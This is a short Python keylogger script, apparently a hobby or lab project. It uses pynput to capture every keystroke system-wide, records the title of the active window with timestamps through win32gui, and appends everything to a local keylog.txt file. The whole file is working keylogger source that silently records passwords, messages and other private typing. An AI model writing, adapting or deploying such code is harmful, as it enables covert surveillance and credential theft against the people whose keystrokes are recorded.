#-------------------------------------------------------------#
# _   __ _______   __  _     _____ _____ _____  ___________   #
#| | / /|  ___\ \ / / | |   |  _  |  __ \  __ \|  ___| ___ \  #
#| |/ / | |__  \ V /  | |   | | | | |  \/ |  \/| |__ | |_/ /  #
#|    \ |  __|  \ /   | |   | | | | | __| | __ |  __||    /   #
#| |\  \| |___  | |   | |___\ \_/ / |_\ \ |_\ \| |___| |\ \   #
#\_| \_/\____/  \_/   \_____/\___/ \____/\____/\____/\_| \_|  #
#-------------------------------------------------------------#


import threading
from pynput import keyboard as kb
import win32gui
import re
import time 
import os
import sys

#heoo●*

lastWindow = None
lastSpecialKey = None

KEYLOGGER_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
LOG_FILE = os.path.join(KEYLOGGER_DIR, "keylog.txt")


def getWindow():
    text = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    text = re.sub(r"[*●]","",text) # replace '●' or '*' in str
    return text

def keyPressed(key):
    global lastWindow,lastSpecialKey,c
    currentWindow = getWindow()
    timeStamp = time.strftime("[%Y-%m-%d %H:%M:%S]")

    #checking if window changed
    if currentWindow != lastWindow:
        lastWindow = currentWindow
        text = "\n\n"+timeStamp+" 🪟 "+lastWindow+"\n" # example : '[2025-07-15 08:51:38] 🪟  script.py - MalwareLab - Visual Studio Code'
        with open(LOG_FILE,"a",encoding="utf-8") as f: 
            f.write(text)

    #convert to key to chr, if falure then to str
    try:
        key = key.char
    except AttributeError:
        key = str(key) 
        if key == "Key.enter":
            key = ' [Enter]\n'
        elif key == "Key.space":
            key = ' '    
        else:
            key = ''    
    with open(LOG_FILE,"a",encoding="utf-8") as f:
        f.write(key)    

#will do later    
def keyReleased(key):
    return

with kb.Listener(on_press=keyPressed,on_release=keyReleased) as listener:
    listener.join()
